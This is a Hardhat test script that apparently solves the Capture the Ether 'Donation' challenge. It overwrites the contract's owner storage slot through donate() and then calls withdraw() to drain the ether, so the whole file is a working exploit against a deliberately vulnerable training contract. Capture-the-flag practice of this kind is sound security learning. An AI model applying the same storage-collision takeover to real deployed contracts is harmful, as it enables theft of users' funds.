import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import {
    DonationChallenge,
    DonationCheck,
    DonationCheck__factory,
} from "../typechain-types"
import { assert, expect } from "chai"
import { ethers, network } from "hardhat"
import { BigNumber, providers, Signer, Wallet } from "ethers"
import "dotenv/config"

describe("Donation challenge", function () {
    let attacker: Wallet
    let target: DonationChallenge
    before(async function () {
        // Setup code here
        let instanceAddress: string =
            "0x7AE7F22c42d0047e95c29eD7e0476c7791EA4996"
        attacker = new Wallet(
            process.env.METAMASK_PRIVATE_KEY!,
            ethers.provider
        )
        target = await ethers.getContractAt(
            "DonationChallenge",
            instanceAddress,
            attacker
        )
    })

    it("Attacking contract", async function () {
        // Exploit code here
        let tx, blockInitNum, blockFinNum

        const attackerFactory: DonationCheck__factory =
            await ethers.getContractFactory("DonationCheck")
        const attackerContract: DonationCheck = await (
            await attackerFactory.deploy()
        ).connect(attacker)

        let msgval = await attackerContract.checkVal(attacker.address)
        console.log(`msgval needed: ${ethers.utils.formatEther(msgval)} ETH`)

        console.log(
            `slot 1: ${await ethers.provider.getStorageAt(target.address, 1)}`
        )

        tx = await target.donate(attacker.address, { value: msgval })
        await tx.wait(1)

        console.log(
            `slot 1 after attack: ${await ethers.provider.getStorageAt(
                target.address,
                1
            )}`
        )
        tx = await target.withdraw()
        await tx.wait(1)
    })

    after(async function () {
        // Verification Code here
        assert(await target.isComplete(), "Challenge not completed")
    })
})
